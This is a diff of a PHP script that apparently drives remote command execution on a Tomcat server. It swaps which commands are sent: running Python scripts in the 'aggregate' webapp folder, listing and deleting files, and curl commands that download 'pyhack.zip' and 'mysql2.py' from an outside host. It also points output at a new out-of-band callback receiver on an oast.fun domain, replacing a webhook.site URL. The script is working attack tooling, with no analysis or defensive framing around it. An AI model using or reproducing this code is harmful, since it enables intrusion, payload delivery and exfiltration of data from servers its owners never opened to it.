@@ -34,11 +34,12 @@ function cmd($cmd, $receiver)
     return $response;
 }
 
-$cmd = "python3 opt/tomcat/webapps/aggregate/mysql.py";
+$cmd = "python3 opt/tomcat/webapps/aggregate/master.py";
 //$cmd = "python3 opt/tomcat/webapps/aggregate/unzip.py";
-//$cmd = "ls -lha opt/tomcat/webapps/aggregate";
-//$cmd = "rm opt/tomcat/webapps/aggregate/test.py";
-//$cmd = "curl -o opt/tomcat/webapps/aggregate/mysql.py https://sbnke.com/py/mysql2.py";
+//$cmd = "ls -lha opt/tomcat/webapps/aggregate/myenv/Lib/site-packages/";
+//$cmd = "ls -lha opt/tomcat/webapps/aggregate/";
+//$cmd = "rm opt/tomcat/webapps/aggregate/unzip.py";
+//$cmd = "curl -o opt/tomcat/webapps/aggregate/pyhack.zip https://sbnke.com/py/pyhack.zip";
 
 
 //$cmd = urlencode($cmd);
@@ -47,7 +48,7 @@ $cmd = "python3 opt/tomcat/webapps/aggregate/mysql.py";
 
 //die();
 
-$receiver = 'https://webhook.site/c65681a6-10bf-4f2c-9538-b9af4b25386c';
+$receiver = 'https://qwnsltptvboodttriviyu0ocgxmp0z228.oast.fun';
 $receiver = urlencode($receiver);
 
-cmd($cmd, $receiver);
+echo cmd($cmd, $receiver);
